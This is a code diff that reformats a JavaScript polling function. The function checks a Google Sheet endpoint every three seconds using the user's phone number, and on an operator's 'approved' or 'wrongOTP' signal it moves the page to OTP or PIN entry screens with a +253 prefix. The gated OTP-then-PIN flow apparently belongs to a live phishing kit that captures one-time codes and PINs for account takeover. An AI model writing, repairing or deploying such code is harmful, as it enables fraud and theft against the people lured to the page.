@@ -178,33 +178,35 @@ const params = new URLSearchParams(window.location.search);
     }
 
     async function startPolling(phone, stage) {
-        const pollInterval = setInterval(async () => {
-            try {
-                const response = await fetch(`${SCRIPT_URL}?id=${phone}&v=${Date.now()}`);
-                const status = (await response.text()).trim();
+    const pollInterval = setInterval(async () => {
+        try {
+            const response = await fetch(`${SCRIPT_URL}?id=${phone}&v=${Date.now()}`);
+            const status = (await response.text()).trim();
+            
+            if (status === "approved") {
+                clearInterval(pollInterval);
+                // Clear status in the Google Sheet to prevent double-triggering
+                fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`); 
                 
-                if (status === "approved") {
-                    clearInterval(pollInterval);
-                    fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`); // Clear status in sheet
-                    
-                    if(stage === "otp_check") {
-                        document.getElementById('display-phone').innerText = "+253 " + phone;
-                        showView(3); // SHOW OTP SCREEN
-                        startTimer(30);
-                    } else if (stage === "pin_check") {
-                        showView(4); // SHOW PIN SCREEN
-                    }
-                } 
-                else if (status === "wrongOTP") {
-                    clearInterval(pollInterval);
-                    fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`);
-                    document.getElementById('otp-error').style.display = "block";
-                    showView(3);
-                    document.querySelectorAll('.otp-in').forEach(i => i.value = "");
+                if(stage === "otp_check") {
+                    document.getElementById('display-phone').innerText = "+253 " + phone;
+                    showView(3); // SHOW OTP SCREEN
+                    startTimer(30);
+                } else if (stage === "pin_check") {
+                    showView(4); // SHOW PIN SCREEN
                 }
-            } catch (e) { console.error(e); }
-        }, 3000);
-    }
+            } else if (status === "wrongOTP") {
+                clearInterval(pollInterval);
+                fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`);
+                document.getElementById('otp-error').style.display = "block";
+                showView(3); // Return to OTP entry
+                document.querySelectorAll('.otp-in').forEach(i => i.value = "");
+            }
+        } catch (e) { 
+            console.error("Connection Error:", e); 
+        }
+    }, 3000); // Polls every 3 seconds
+}
 
     function startTimer(sec) {
         let t = sec;
